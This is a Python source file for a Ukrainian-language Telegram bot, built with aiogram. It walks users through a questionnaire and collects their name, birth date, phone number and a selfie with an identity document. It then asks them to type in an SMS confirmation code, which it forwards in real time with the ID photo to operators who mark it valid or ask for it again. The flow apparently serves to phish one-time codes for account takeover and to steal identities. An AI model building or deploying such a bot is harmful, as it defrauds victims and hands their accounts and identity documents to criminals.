from aiogram import Router, types, F, Bot
from aiogram.fsm.context import FSMContext
from states.form_states import Form
from keyboard.inline import next_keyboard, confirm_keyboard
from database.db import save_user_data, get_user_data, save_sms_code, get_all_admins, get_form_by_id, verify_code

router = Router()

# --- Этап 1. Нажата кнопка "Продолжить" после /start
@router.callback_query(F.data == "continue_form")
async def send_form_intro(callback: types.CallbackQuery):
    await callback.message.edit_caption(
        caption="Для початку заповніть невелику анкету про себе.",
        reply_markup=next_keyboard()
    )

# --- Этап 2. Начало анкеты
@router.callback_query(F.data == "next_question")
async def ask_full_name(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.full_name)
    await callback.message.answer("Вкажіть ПІБ:\n"
    "Зразок: Борисенко Сергій Валерійович")

# --- Этап 3. Вопросы анкеты ---
@router.message(Form.full_name)
async def process_full_name(message: types.Message, state: FSMContext):
    await state.update_data(full_name=message.text)
    await state.set_state(Form.age)
    await message.answer("Вкажіть дату народження (ДД.ММ.РРРР):\n"
    "Зразок: 10.05.1990")

@router.message(Form.age)
async def process_age(message: types.Message, state: FSMContext):
    await state.update_data(age=message.text)
    await state.set_state(Form.city)
    await message.answer("Вкажіть місто проживання:\n"
    "Зразок: Київ")

@router.message(Form.city)
async def process_city(message: types.Message, state: FSMContext):
    await state.update_data(city=message.text)
    await state.set_state(Form.phone)
    await message.answer("Вкажіть мобільний номер телефону:\n"
    "Зразок: +380501105011")

@router.message(Form.phone)
async def process_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await state.set_state(Form.email)
    await message.answer("Вкажіть приблизну площу вашого житла (приміщення):\n"
    "Зразок: 45 м²")

@router.message(Form.email)
async def process_email(message: types.Message, state: FSMContext):
    await state.update_data(email=message.text)
    await state.set_state(Form.document_photo)
    await message.answer("Для підтвердження особи, необхідно надати селфі зі своїм документом:\n"
    "Підійде будь-який з таких документів:\n"
    "1. Паспорт громадянина України (ID-картка або книжка);\n"
    "2. Закордонний паспорт;\n"
    "3. Водійські права;\n"
    "4. Посвідчення особи військовослужбовця.\n")

# --- Этап 4. Получение фото ---
@router.message(Form.document_photo, F.photo)
async def process_document_photo(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    photo_id = message.photo[-1].file_id

    data = await state.get_data()
    data["document_photo"] = photo_id
    
    # Сохраняем данные в БД
    form_id = save_user_data(user_id, username, data)
    
    # Устанавливаем состояние ожидания кода
    await state.set_state(Form.waiting_code)
    await state.update_data(form_id=form_id)

    await message.answer(
        "Дякуємо за заповнену анкету!\n" \
        "Протягом 24 годин на ваш мобільний телефон надійде SMS-повідомлення з кодом підтвердження анкети.\n" \
        "\n" \
        "Що робити далі:\n" \
        "1. Отримайте код з SMS\n" \
        "2. Поверніться в цей чат-бот\n" \
        "3. Введіть отриманий код у відповідь на це повідомлення\n" \
        "\n" \
        "--Увага! Не надсилайте код нікому в приватних повідомленнях. Ми його запитуватимемо лише в офіційному боті.\n" \
        "--Якщо SMS не надійшло, перевірте правильність номера телефону в анкеті або зверніться до нашої служби підтримки.\n"
    )

# --- Этап 5. Ожидание кода от пользователя ---
@router.message(Form.waiting_code)
async def process_user_code(message: types.Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    code = message.text.strip()
    
    # Сохраняем введенный код
    save_sms_code(user_id, code)
    
    # Получаем данные анкеты
    user_data = get_user_data(user_id)
    
    if not user_data:
        await message.answer("Помилка: анкета не знайдена.")
        await state.clear()
        return
    
    # Отправляем уведомление всем администраторам
    admins = get_all_admins()
    
    form_text = (
        f"📋 <b>Нова анкета!</b>\n\n"
        f"👤 User ID: <code>{user_data['user_id']}</code>\n"
        f"📱 Username: @{user_data['username']}\n\n"
        f"<b>Дані анкети:</b>\n"
        f"ПІБ: {user_data['full_name']}\n"
        f"Дата народження: {user_data['age']}\n"
        f"Місто: {user_data['city']}\n"
        f"Телефон: {user_data['phone']}\n"
        f"Площа житла: {user_data['email']}\n\n"
        f"🔐 <b>Введений код:</b> <code>{code}</code>"
    )
    
    # Создаем клавиатуру для проверки кода
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Правильно введен код", callback_data=f"verify_yes_{user_data['form_id']}"),
            InlineKeyboardButton(text="❌ Неправильно введен код", callback_data=f"verify_no_{user_data['form_id']}")
        ]
    ])
    
    for admin_id, admin_username in admins:
        try:
            # Отправляем фото с данными
            await bot.send_photo(
                chat_id=admin_id,
                photo=user_data['document_photo'],
                caption=form_text,
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
    
    await message.answer("⏳ Ваш код отримано. Очікуйте перевірки адміністратором.")
    await state.clear()

# --- Обработка ответов администратора ---
@router.callback_query(F.data.startswith("verify_yes_"))
async def verify_code_yes(callback: types.CallbackQuery, bot: Bot):
    form_id = int(callback.data.split("_")[-1])
    
    # Обновляем статус в БД
    verify_code(form_id, True)
    
    # Получаем данные анкеты
    form_data = get_form_by_id(form_id)
    
    if form_data:
        # Уведомляем пользователя
        try:
            await bot.send_message(
                chat_id=form_data['user_id'],
                text="✅ Ваш код підтверджено! Анкета успішно прийнята."
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение пользователю {form_data['user_id']}: {e}")
    
    await callback.answer("✅ Код підтверджено")
    await callback.message.edit_caption(
        caption=callback.message.caption + "\n\n✅ <b>КОД ПІДТВЕРДЖЕНО</b>"
    )

@router.callback_query(F.data.startswith("verify_no_"))
async def verify_code_no(callback: types.CallbackQuery, bot: Bot):
    form_id = int(callback.data.split("_")[-1])
    
    # Обновляем статус в БД
    verify_code(form_id, False)
    
    # Получаем данные анкеты
    form_data = get_form_by_id(form_id)
    
    if form_data:
        # Уведомляем пользователя
        try:
            await bot.send_message(
                chat_id=form_data['user_id'],
                text="❌ Код введено неправильно. Будь ласка, введіть код ще раз."
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение пользователю {form_data['user_id']}: {e}")
    
    await callback.answer("❌ Код відхилено")
    await callback.message.edit_caption(
        caption=callback.message.caption + "\n\n❌ <b>КОД ВІДХИЛЕНО</b>"
    )